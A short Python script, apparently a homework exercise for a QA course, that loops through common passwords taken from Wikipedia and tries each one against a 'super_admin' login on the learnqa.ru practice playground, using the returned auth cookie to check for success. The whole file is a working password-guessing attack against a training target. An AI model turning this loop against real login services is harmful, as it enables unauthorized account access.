import requests
import get_password_from_wiki

all_passwords = list(filter(None, get_password_from_wiki.get_passwords_from_wiki()))
unique_passwords = set(all_passwords)

login = "super_admin"

password = ""
for password in unique_passwords:
    payload = {"login": login, "password": password}
    response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=payload)
    cookie = response.cookies.get("auth_cookie")
    cookie_params = {"cookie": cookie}
    response_auth = requests.get("https://playground.learnqa.ru/ajax/api/check_auth_cookie", params=cookie_params)
    if response_auth.text != "You are NOT authorized":
        print(f"login = {login}, password = {password}")
        break
